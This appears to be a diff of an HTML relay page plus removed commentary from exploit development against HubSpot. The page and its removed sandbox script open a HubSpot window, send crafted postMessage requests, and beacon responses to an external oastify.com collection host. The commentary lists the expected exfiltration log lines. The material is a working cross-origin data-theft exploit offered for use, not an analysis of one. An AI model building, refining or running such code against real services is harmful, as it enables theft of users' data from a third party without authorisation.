@@ -3,7 +3,7 @@
 <head><title>Relay</title></head>
 <body>
 <h1>Relay Active</h1>
-<div id="status"></div>
+<div id="status" style="font-family:monospace;font-size:12px;"></div>
 <script>
 const EXFIL = 'https://sb7vo63by517nq7kyd6fe03t8keb2aqz.oastify.com';
 const status = document.getElementById('status');
@@ -24,60 +24,23 @@ window.addEventListener('message', function(e) {
     if (e.data && e.data.action === 'startExploit') {
         log('EXPLOIT_TRIGGERED');
         
+        // Create sandboxed iframe pointing to separate file
         const iframe = document.createElement('iframe');
         iframe.sandbox = 'allow-scripts allow-popups allow-same-origin';
+        iframe.src = 'sandbox.html';  // ← Use separate file instead of srcdoc
         iframe.style.cssText = 'width:100%;height:400px;border:3px solid red';
         
-        iframe.srcdoc = `
-<h2>Sandbox</h2><div id=log></div>
-<script>
-const E='https://sb7vo63by517nq7kyd6fe03t8keb2aqz.oastify.com';
-function l(m){document.getElementById('log').innerHTML+='<br>'+m;new Image().src=E+'/?s='+encodeURIComponent(m)}
-l('loaded_origin='+window.origin);
-let h=window.open('https://app-eu1.hubspot.com','hub','width=800,height=600');
-if(!h){l('blocked')}else{l('opened');let a=0,c=setInterval(()=>{a++;try{h.origin;if(a%10==0)l('wait_'+a)}catch(e){clearInterval(c);l('ready_'+a);window.addEventListener('message',r=>{l('resp='+r.origin);new Image().src=E+'/?r='+encodeURIComponent(JSON.stringify(r.data).substring(0,200))});setTimeout(()=>{l('send1');h.postMessage({type:'CONTENT_ASSISTANCE_DELEGATED_REQUEST',commandId:'x',featureId:'x',parameters:{},resultCount:1,language:'en',objectId:'46962361',applicationId:'x',basePath:'/',maxPollingAttempts:1,pollingInterval:100},'*')},1000);setTimeout(()=>{l('send2');h.postMessage({type:'raw',_callbackId:'x',body:{action:'getData'}},'*')},2000)}if(a>100){clearInterval(c);l('timeout')}},100)}
-
-        `;
-        
         document.body.appendChild(iframe);
-        log('SANDBOX_CREATED');
+        log('SANDBOX_IFRAME_ADDED');
     }
 });
 
 if(window.opener){
     log('has_opener');
     window.opener.postMessage({status:'ready'},'*');
-}else{
+} else {
     log('no_opener');
 }
 </script>
 </body>
 </html>
-```
-
----
-
-## **What this does:**
-
-1. **Logs EVERY message** it receives (so we can see if `startExploit` arrives)
-2. **Checks for `action: 'startExploit'`** specifically
-3. **Creates minimal sandbox** with compressed code
-4. **Sends two different exploit types** to HubSpot
-
----
-
-## **After updating both files, you should see:**
-```
-/?step=1_clicked
-/?step=2_opened
-/?step=3_sending
-/?step=4_sent
-/?log=MSG_FROM=https://146256700.hubspotpreview-eu1.com_DATA={"action":"startExploit","timestamp":...}
-/?log=EXPLOIT_TRIGGERED
-/?log=SANDBOX_CREATED
-/?s=loaded_origin=null           <-- KEY!
-/?s=opened
-/?s=ready_15
-/?s=send1
-/?s=send2
-/?r={"type":"..."}               <-- THE RESPONSE!
